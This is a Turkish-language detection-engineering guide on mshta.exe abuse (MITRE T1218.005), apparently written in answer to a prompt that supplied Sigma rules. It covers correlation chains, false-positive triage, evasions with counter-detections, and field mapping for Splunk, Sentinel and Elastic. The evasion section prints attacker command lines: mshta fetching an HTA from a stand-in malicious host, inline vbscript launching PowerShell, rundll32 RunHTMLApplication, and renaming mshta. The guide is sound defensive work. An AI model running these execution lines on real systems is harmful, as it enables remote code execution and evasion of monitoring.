# Mshta Abuse — Tespiti

## 1. Özet: saldırı + naif tespit

`mshta.exe`, Windows'un `C:\Windows\System32\` (ve `SysWOW64`) altında yaşayan, "Microsoft HTML Application Host" adlı bir ikilidir. Asıl işi, `.hta` uzantılı HTML Application dosyalarını çalıştırmaktır — yani içinde VBScript veya JScript barındıran, ama tarayıcının güvenlik kısıtlamalarına (zone, sandbox) tabi olmayan HTML sayfalarını. Bu, saldırgan için altın değerinde bir özellik: `mshta`, imzalı bir Microsoft ikilisi (LOLBIN), varsayılan olarak her Windows'ta var, ve doğrudan uzak bir URL'den kod çalıştırabiliyor. `mshta https://kotu[.]site/a.hta` yazmanız yeterli; dosyayı diske indirmeden, bellekte JScript/VBScript motorunu ayağa kaldırıp payload'ı koşturur. MITRE ATT&CK bunu **T1218.005 (System Binary Proxy Execution: Mshta)** olarak sınıflandırır.

Tipik saldırı zinciri şudur: bir phishing e-postasındaki Office belgesi bir makro çalıştırır veya bir LNK dosyası tıklanır, bu da `mshta`'yı ya uzak bir URL ile ya da `javascript:`/`vbscript:` protokol handler'ı ile ("inline" mshta) tetikler. İçerideki script çoğu zaman bir sonraki aşama loader'ı — PowerShell'i indirir, bir DLL'i `regsvr32` ile yükler, ya da doğrudan shellcode enjekte eder. Metasploit, Cobalt Strike, CACTUSTORCH gibi framework'lerin hepsinin hazır `mshta` teslimat modülü vardır. Prompt'taki gerçek Sigma kuralı **HackTool - CACTUSTORCH Remote Thread Creation** (`2e4e488a-...`) tam da bunu yakalar: `SourceImage` `\System32\mshta.exe` iken `TargetImage` içinde `\SysWOW64\` geçen bir `create_remote_thread` — yani mshta'nın başka bir sürece uzak thread açması.

Herkesin yazdığı naif tespit basittir: **process creation loglarında `Image` endswith `\mshta.exe` olan her şeyi yakala**, ya da bir adım öteye gidip komut satırında `http`, `https`, `javascript:`, `vbscript:` geçenleri filtrele. Sysmon Event ID 1 veya Windows Security 4688 üzerinde `mshta.exe` + şüpheli komut satırı. Bu, blog yazılarının %90'ının verdiği cevaptır ve iyi bir başlangıç noktasıdır — ama sahada tek başına bir alarm hattı olarak kurarsanız ya boğulursunuz ya da kör kalırsınız. Değerin başladığı yer burasıdır.

## 2. Naif tespit neden yetmez

İlk problem: **`mshta.exe` çıplak imaj adıyla aramak, gerçek ortamda düşündüğünüzden daha gürültülüdür ama aynı zamanda düşündüğünüzden daha kolay atlatılır.** İki uçlu bir kılıç. Bir yandan bazı eski kurumsal uygulamalar (özellikle in-house geliştirilmiş, HTA tabanlı admin panelleri, eski ERP/muhasebe yazılımlarının konfigürasyon araçları, hatta bazı Citrix/VDI ilan kutuları) mshta'yı meşru olarak, hem de düzenli olarak çağırır. Bir bankada veya sigorta şirketinde 15 yıllık legacy HTA uygulamaları görmek istisna değil, kuraldır. Bu ortamlarda "her mshta = alarm" kuralı günde yüzlerce false positive üretir ve SOC ekibi üç gün içinde bu kuralı susturur (mute eder) — ki gerçek saldırı geldiğinde alarm zaten kapalıdır. Klasik "alert fatigue → kuralı kapat → kör nokta" döngüsü.

İkinci problem — asıl önemlisi — **komut satırı tabanlı tespit, komut satırının içeriğine güvenir ve saldırgan komut satırını istediği gibi bozabilir.** `mshta http://...` yakalıyorsanız, saldırgan URL'yi çağırmaz. Bunun yerine yerel diske yazdığı bir `.hta` dosyasını çağırır (`mshta C:\Users\Public\update.hta`) — artık komut satırında ne `http` ne `javascript:` var. Ya da uzantıyı gizler: `mshta`, dosya uzantısına bakmaz, içeriğe bakar; dolayısıyla `mshta C:\temp\logo.png` çalışır, yeter ki `logo.png`'nin içinde geçerli HTA/script olsun. Uzantı tabanlı hiçbir kural bunu görmez.

Üçüncü ve en sinsi problem: **`Image=mshta.exe` filtresi, mshta'nın adının değiştirilmesiyle (rename) veya HTA motorunun mshta olmadan yüklenmesiyle tamamen atlatılır.** Saldırgan `mshta.exe`'yi `svchost.exe` ismiyle kopyalayıp çalıştırırsa `Image` alanınız artık `svchost.exe` der (bu yüzden `OriginalFileName` alanına bakmak şarttır — buna 6. bölümde döneceğim). Daha da kötüsü, HTA çalıştırmak için mshta.exe teknik olarak gerekli değildir: `mshtml.dll` içindeki `RunHTMLApplication` fonksiyonu doğrudan `rundll32` ile çağrılabilir (`rundll32 javascript:"..\mshtml,RunHTMLApplication ";...`). Bu meşhur atlatma, adında "mshta" geçmeyen ama tam olarak aynı script motorunu çalıştıran bir tekniktir. Sadece `mshta.exe`'ye kilitlenmiş bir SOC bunu tamamen kaçırır.

Özetle naif kural üç şeyi aynı anda yapamıyor: legacy gürültüsünü elemek, komut satırı obfuscation'ına dayanmak, ve mshta dışı HTA yürütme yollarını görmek. Değer, tek bir "daha iyi kural" yazmakta değil — çünkü öyle bir kural yok — sinyalleri **bağlamda** değerlendirmekte.

## 3. Korelasyon zinciri (asıl değer)

`mshta.exe` çalıştı — bu tek başına neredeyse hiçbir şey söylemez. Onu yüksek güvenli bir tespite çeviren şey, **ebeveyn-çocuk zinciri + ağ davranışı + kısa zaman penceresindeki takip aktivitesidir.** Kıdemli bir analist tek olaya değil, olay komşuluğuna bakar. İşte gerçek dünyada işe yarayan zincirler:

**Zincir 1 — Ofis makrosundan teslimat:**
`A` = `WINWORD.EXE` / `EXCEL.EXE` / `OUTLOOK.EXE` bir çocuk süreç doğurur (Sysmon EID 1, `ParentImage` endswith `\winword.exe`, `Image` endswith `\mshta.exe`).
`+` `B` = aynı `mshta` süreci **60 saniye içinde** dışarıya HTTP/HTTPS bağlantısı açar (Sysmon EID 3, `Image` endswith `\mshta.exe`, `DestinationPort` 80/443, `Initiated` true) — hedef domain düşük itibarlı bir TLD ise (prompt'taki `68c2c604-...` kuralı: host endswith `.top`, `.xyz`, `.ru`, `.click`...) güven daha da yükselir.
`+` `C` = **aynı** mshta süreci bir çocuk doğurur: `powershell.exe`, `cmd.exe`, `regsvr32.exe`, `rundll32.exe` (`ParentImage` endswith `\mshta.exe`).
Bu üçü aynı process tree içinde ve saniyeler arayla olduğunda, false positive olasılığı pratikte sıfırdır. Office bir HTA'ya, HTA bir shell'e — meşru hiçbir iş akışı böyle görünmez.

**Zincir 2 — Antivirüs "engelledim" der ama iş orada bitmez:**
Prompt'taki gerçek kural **Antivirus - Relevant File Paths Alerts** (`c9a88268-...`) tam da bunun için var. AV, `C:\Users\Public\` veya `C:\Temp\` veya `C:\PerfLogs\` altında `.hta` içeren bir dosyayı karantinaya aldı. Naif refleks: "AV halletti, kapat." Kıdemli refleks: **"Bu dosya oraya nasıl geldi?"** Korelasyon: AV alarmı (`.hta` in relevant path) `+` aynı host'ta ±5 dakika içinde `mshta.exe` process creation `+` o mshta'nın ebeveyni bir tarayıcı/mail istemcisi veya bir Office ürünü. AV bir örneği yakaladıysa, aynı kampanyanın yakalanmayan ikinci aşaması muhtemelen zaten çalıştı. AV alarmını bir *son* değil, bir *tetikleyici* olarak kullanın.

**Zincir 3 — ADS ile gizleme + yürütme:**
Prompt'taki **Creation Of a Suspicious ADS File Outside a Browser Download** (`573df571-...`) kuralı, tarayıcı olmayan bir sürecin `.hta` uzantı içeren bir Alternate Data Stream (`:Zone.Identifier` veya benzeri) yazdığını yakalar. Bunu tek başına görürseniz zayıf; ama `create_stream_hash` ile `.hta` yazımı `+` kısa süre sonra `mshta` yürütmesi = mark-of-the-web bypass ile teslim edilmiş bir HTA loader'ı. Bu, iki farklı Sysmon log kategorisini (EID 15 ve EID 1) birbirine bağladığınızda ortaya çıkan bir desendir — hiçbir tekil kural size bunu vermez.

**Zincir 4 — Yatay hareket bağlamı (farklı host):**
En güçlü sinyallerden biri şudur: `host-A`'da mshta → PowerShell zinciri çalıştı `+` **5-10 dakika içinde** aynı kullanıcı hesabıyla `host-B`'ye bir uzak oturum (4624 Logon Type 3, veya WMI/WinRM ile süreç oluşturma, ya da `host-B`'de yeni bir mshta/PowerShell). Tek bir makinede mshta bir "belki"; iki makinede aynı hesapla dakikalar içinde tekrarlanan aynı zincir bir "kesinlikle". Detection engineer'in işi bu iki olayı `SubjectUserName` / `TargetUserName` ve zaman ekseninde birbirine dikmektir. SIEM'de bu, bir `transaction` veya `join` sorgusudur; asıl beceri, hangi alanların stitch anahtarı olacağını bilmektir (kullanıcı SID'i > kullanıcı adı, çünkü ad çakışabilir).

Özet felsefe: mshta bir *pivot noktasıdır*, sonuç değil. Alarm mshta'da başlamalı ama karar zincirin tamamına bakılarak verilmeli. "mshta + dış bağlantı + shell çocuk + kısa zaman penceresi" dörtlüsü, herhangi bir tekil kuraldan kat kat yüksek güven verir ve legacy HTA gürültüsünü doğal olarak eler (çünkü in-house HTA uygulaması ne internete C2 açar ne de PowerShell doğurur).

## 4. False positive gerçeği ve triage yargısı

Sahada `mshta.exe`'yi meşru olarak ateşleyen şeyleri bilmeden hiçbir triage yapamazsınız. Gerçek kaynaklar:

- **Legacy in-house HTA uygulamaları:** Yukarıda değindim. Muhasebe, İK, üretim hattı terminalleri. Bunlar genelde `ParentImage` olarak `explorer.exe` (kullanıcı çift tıklıyor) veya bir kısayol/başlat menüsü altında görünür, komut satırında yerel bir dosya yolu vardır (`C:\App\panel.hta`), ve **dış ağ bağlantısı açmaz, PowerShell/cmd doğurmaz.** Ebeveyn `explorer.exe` + yerel `.hta` yolu + ağ sessizliği = neredeyse kesin meşru.
- **SCCM / yazılım dağıtımı:** Bazı paketleme araçları ve dağıtım script'leri kurulum sırasında HTA UI'ları gösterir. Ebeveyn genelde `ccmexec.exe`, `tsmanager.exe` veya bir installer sürecidir. Ebeveyne bakmak ayırt eder.
- **Yedekleme ve yönetim ajanları, vulnerability scanner'lar (Nessus/Qualys ajan taraması):** Bunlar mshta'yı doğrudan çağırmaz ama tarama sırasında geçici script'ler ve LOLBIN'ler tetikleyebilir; özellikle authenticated scan pencerelerinde sahte pozitif kümelenmesi görürsünüz. Scanner'ın kaynak IP'sini/host'unu ve tarama zaman pencerelerini bir allowlist/bağlam tablosu olarak tutmak, bu gürültüyü kesmenin standart yoludur.
- **Admin script'leri ve altın imajlar:** Bazı kurumsal imaj hazırlama (MDT/altın imaj) süreçleri mshta kullanır. Genelde belirli servis hesaplarıyla ve belirli zamanlarda.

Kıdemli analistin gerçek/gürültü ayrımında baktığı sıra, bir **triage ağacı** gibi işler ve önemi azalan sırayla şöyledir:

1. **Ebeveyn süreç (en yüksek sinyal):** `ParentImage`. Ofis ürünü, mail istemcisi, tarayıcı, `wscript`/`cscript`, ya da hiç ebeveyni olmayan/garip bir ebeveyn (örn. `wmiprvse.exe` — WMI ile uzaktan tetiklenmiş) = kötüye çok yakın. `explorer.exe`, `ccmexec.exe`, bilinen bir installer = büyük olasılıkla meşru. Ebeveynin ebeveynine de bakın (grandparent); Office → cmd → mshta gibi araya karıştırılmış zincirler vardır.
2. **Ağ davranışı:** mshta dışarı bağlanıyor mu? Nereye? İç IP'ye mi (muhtemelen legacy app'in backend'i) yoksa dış/düşük itibarlı domaine mi? Hiç bağlanmıyorsa teslimat riski düşer.
3. **Çocuk süreçler:** mshta bir shell/LOLBIN doğurdu mu? Doğurduysa oyun biter, bu meşru HTA davranışı değildir.
4. **Komut satırı içeriği:** `javascript:`, `vbscript:`, base64, `http`, olağandışı uzantılı dosya (`.png`, `.txt`, `.log` bir HTA olarak çağrılıyor). Ama bunun *en son* geldiğine dikkat — çünkü en kolay obfuscate edilen sinyal budur.
5. **Bağlam/kullanıcı:** Bu host bir developer makinesi mi (LOLBIN gürültüsü doğal yüksek), bir finans kullanıcısının makinesi mi (mshta hiç görülmemeli), yoksa bir sunucu mu (sunucuda interaktif mshta çok daha şüpheli)?

Çoklu alarm geldiğinde ilk bakılacak şey **process tree ve zaman ekseni**dir — hangi olay tetikleyici, hangileri sonuç. Analist önce en "erken" ve en "kök" olaya iner (genelde teslimat: Office makrosu veya ilk mshta), oradan aşağı doğru zinciri okur. On tane ayrı alarmı tek tek kapatmak yerine, hepsini tek bir process tree'ye ve tek bir incident'a bağlamak — triage'ın özü budur.

## 5. Kaçınma → karşı-tespit (derin kedi-fare)

Saldırgan naif kuralı bildiğini varsayın. İşte kural dokümanında yazmayan atlatmalar ve her birine ikinci-derece tespit:

**Atlatma 1 — mshta'yı yeniden adlandırma (rename LOLBIN):**
`copy C:\Windows\System32\mshta.exe C:\Users\Public\host.exe` sonra `host.exe payload.hta`. `Image` alanınız artık `host.exe` der.
→ **Karşı-tespit:** `Image` yerine `OriginalFileName` alanına bakın. Sysmon EID 1 ve PE metadata'sı, dosya adı ne olursa olsun orijinal `MSHTA.EXE`'yi taşır. Kuralınız `OriginalFileName: MSHTA.EXE AND NOT Image endswith '\mshta.exe'` derse, yeniden adlandırmayı doğrudan yakalarsınız — üstelik bu koşul *başlı başına* yüksek şüphelidir, çünkü meşru hiçbir sebep mshta'yı başka isimle çalıştırmaz.

**Atlatma 2 — rundll32 ile HTA (mshta.exe hiç yok):**
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();...`. Adında mshta geçmez.
→ **Karşı-tespit:** `rundll32` komut satırında `RunHTMLApplication`, `mshtml`, `javascript:`, `vbscript:` string'lerini arayın. Ayrıca `rundll32`'nin `mshtml.dll` yüklemesini (Sysmon EID 7, ImageLoad) ebeveyni Office olduğunda korele edin. Bu, "mshta tespiti"ni "HTA motoru tespiti"ne genişletmek demektir — asıl savunulması gereken yüzey mshta.exe değil, `RunHTMLApplication` çağrısıdır.

**Atlatma 3 — inline protokol (dosya yok, URL yok):**
`mshta vbscript:CreateObject("Wscript.Shell").Run("powershell ...")(window.close)`. Diske hiçbir şey yazılmaz, ağa çıkılmaz; her şey komut satırında.
→ **Karşı-tespit:** Komut satırında `vbscript:`/`javascript:` + `CreateObject` + `Run`/`Exec` + `window.close` kombinasyonu. Ama daha sağlamı yine davranıştır: mshta'nın `powershell`/`cmd` çocuğu. İçerik obfuscate edilse bile, doğan çocuk süreç davranışsal olarak görünür.

**Atlatma 4 — obfuscation / karakter kaçırma:**
Komut satırında `h^t^t^p`, char kodlama, `%COMSPEC%` gibi ortam değişkenleri, ya da HTA içinde base64/XOR ile gömülü ikinci aşama. String tabanlı tüm kurallarınızı kör eder.
→ **Karşı-tespit:** String eşleşmesinden davranışa kayın. Diske yazılan geçici dosyalar (`create_file`), doğan çocuk süreçler, açılan ağ bağlantıları — bunlar obfuscation'dan etkilenmez. Ek olarak, komut satırı **entropisi** ve olağandışı uzunluk üzerinde anomali (uzun, yüksek entropili mshta komut satırı = otomatik şüphe skoru) legacy HTA'ları elerken obfuscate edilmiş olanları öne çıkarır.

**Atlatma 5 — çocuk süreci gizleme (process hollowing / doğrudan enjeksiyon):**
mshta bir `powershell.exe` doğurmak yerine, kendi içinden başka bir sürece kod enjekte eder — böylece `ParentImage=mshta.exe` olan bir shell hiç görünmez.
→ **Karşı-tespit:** İşte prompt'taki **CACTUSTORCH** (`2e4e488a-...`) ve **Rare Remote Thread Creation** (`02d1d718-...`) kuralları tam bu senaryo içindir. `create_remote_thread` kategorisinde `SourceImage` endswith `\mshta.exe` (veya `\wscript.exe`, `\cscript.exe`) iken hedefe uzak thread açılması. `TargetImage` `\SysWOW64\` altındaysa (32-bit sürece enjeksiyon) sinyal daha da keskin. Çocuk süreç görünmüyorsa, enjeksiyon telemetrisine (remote thread, `WriteProcessMemory` benzeri Sysmon EID 8/10) bakın. Bu, EDR'siz saf Sysmon ortamlarında en kritik gap'lerden biridir — `create_remote_thread` loglaması Sysmon config'inizde açık değilse bu atlatmaya tamamen körsünüz.

Genel prensip: her atlatma bir sinyali öldürür ama başka bir sinyali açık bırakır. mshta.exe adını gizlersen `OriginalFileName` kalır; komut satırını obfuscate edersen davranış (çocuk süreç, ağ, dosya) kalır; çocuk süreci gizlersen remote thread kalır. Savunmanın sanatı, saldırganın *aynı anda hepsini* kapatamayacağı bir sinyal demeti kurmaktır. Tek katmanlı tespit her zaman kaybeder; çok-telemetrili korelasyon kazanır.

## 6. SIEM / saha gerçeği

**Varsayılan olarak loglanmayanlar — en büyük tuzak.** Bu bölümdeki her tespit, telemetrinin var olduğunu varsayar; oysa çıplak bir Windows'ta çoğu yoktur:

- **Komut satırı loglaması kapalı gelir.** Security EID 4688 komut satırı alanını (`ProcessCommandLine`) ancak "Include command line in process creation events" audit ayarı (bir Registry/GPO değeri) açıksa doldurur. Açık değilse 4688'de sadece imaj adı vardır, komut satırı boştur — mshta URL tespitlerinizin yarısı sessizce çalışmaz. Bunu mutlaka doğrulayın.
- **4688'in kendisi de "Audit Process Creation" politikası açık olmadan üretilmez.** Birçok kurumda bu kapalıdır ve ekip "mshta kuralım neden hiç ateşlemiyor" diye haftalarca uğraşır — çünkü kaynak log hiç akmıyordur.
- **Sysmon şart, ama config şart.** Sysmon EID 1 (process create) çoğu config'te vardır. Ama bu metindeki korelasyonların bel kemiği olan EID 3 (network), EID 7 (image load — `mshtml.dll` için), EID 8/10 (remote thread / process access — enjeksiyon için) ve EID 15 (create_stream_hash — ADS için) çoğu default/hafif config'te KAPALIDIR veya ağır filtrelenmiştir. SwiftOnSecurity/Olaf config'lerinde bile network ve image-load geniş exclude'larla gelir. `create_remote_thread` (EID 8) loglaması yoksa CACTUSTORCH kuralı ölü koddur.
- **`OriginalFileName` alanı sadece Sysmon EID 1'de güvenilir gelir**; ham 4688'de yoktur. Rename-LOLBIN tespiti Sysmon'a bağımlıdır.

**Field mapping tuzakları — platform farkları:**

- **Sysmon vs Security çakışması:** Aynı olay iki farklı şemayla gelir. Sysmon: `Image`, `ParentImage`, `CommandLine`, `OriginalFileName`. Security 4688: `NewProcessName`, `ParentProcessName`, `ProcessCommandLine` — ve `OriginalFileName` yok. Kuralınızı Sysmon alan adlarıyla yazıp 4688 verisine uygularsanız hiç eşleşmez. Sigma'nın `process_creation` logsource'u bu ikisini soyutlar ama backend'e derlenirken doğru field-mapping (config/pipeline) yüklenmezse sessizce yanlış alan aranır.
- **Splunk:** Genelde Sysmon → `XmlWinEventLog` → CIM `Processes` datamodel. Alanlar CIM'de normalize edilir (`process`, `parent_process`, `process_name`). Ama `OriginalFileName` CIM'de standart bir alan değildir — datamodel'e custom eklemezseniz kaybolur. tstats hızlıdır ama accelerated datamodel'de mshta korelasyonu için `parent_process_name` + `process` join'i yaparken index-time vs search-time field çakışmalarına dikkat.
- **Microsoft Sentinel:** `DeviceProcessEvents` (Defender for Endpoint / MDE) kullanıyorsanız alanlar bambaşka: `FileName`, `ProcessCommandLine`, `InitiatingProcessFileName`, `InitiatingProcessParentFileName`. Burada `InitiatingProcessFileName` = ebeveyn demektir — Sysmon'daki `ParentImage`. `SecurityEvent` (ham 4688) tablosuysa yine `NewProcessName`/`ParentProcessName`. İki tabloyu karıştırmak klasik hatadır. MDE'nin `DeviceNetworkEvents`'i ile mshta process'ini `DeviceProcessEvents`'e bağlamak (network korelasyonu) `DeviceId` + `InitiatingProcessId` + zaman penceresiyle yapılır.
- **Elastic:** ECS normalizasyonu ile `process.name`, `process.parent.name`, `process.command_line`, `process.pe.original_file_name` (rename tespiti burada!). Elastic'in avantajı `process.entity_id` ile gerçek process tree'yi (parent/child) sağlam biçimde diker — Splunk'ta bunu GUID join'iyle elle kurmak zorundasınız. Ama Winlogbeat/Elastic Agent'ın Sysmon modülü doğru pipeline ile kurulmalı; aksi halde `original_file_name` parse edilmez.

**Tuning gerçeği.** Hiçbir mshta kuralı allowlist olmadan production'a çıkmaz. Ama allowlist'i imaj adı veya komut satırıyla değil, **davranış imzasıyla** kurun: "ebeveyni `explorer.exe`, komut satırı `C:\ApprovedApp\*.hta`, dış bağlantı yok, çocuk süreç yok" olan mshta'ları bastırın — imzayı değil aksiyonu allowlist'leyin. Yalnızca dosya yolunu allowlist'lerseniz, saldırgan o yola dosya bırakıp allowlist'in içine saklanır (bu yüzden `C:\Users\Public`, `C:\Temp`, `C:\PerfLogs` gibi dünyaya yazılabilir yollar asla allowlist'e girmez — prompt'taki AV kuralının tam da bu yolları "relevant path" saymasının sebebi budur). İkinci gerçek: kuralı iki kademe yapın. Kademe-1 (düşük eşik, sadece mshta process create) bir "hunting"/düşük-severity sinyal olarak aksın, otomatik alarm üretmesin; Kademe-2 (mshta + ağ + çocuk süreç korelasyonu) yüksek-severity alarm ve otomatik triage tetiklesin. Böylece ne kör kalırsınız ne de gürültüde boğulursunuz.

Son saha notu: bu tespitlerin hiçbiri EDR'nin process tree görünürlüğü olmadan tam güvenilir değildir. Saf Sysmon ile kurulabilir ama config disiplini gerektirir — özellikle EID 8 (remote thread) ve EID 3 (network) loglamasını açık tutmak, çünkü saldırganın en iyi atlatmaları (enjeksiyon, obfuscation) tam olarak bu iki telemetriye çarpar. Config'inizde bu event'ler filtrelenmişse, kağıt üzerinde mükemmel kurallarınız sahada boşluğa ateş eder.
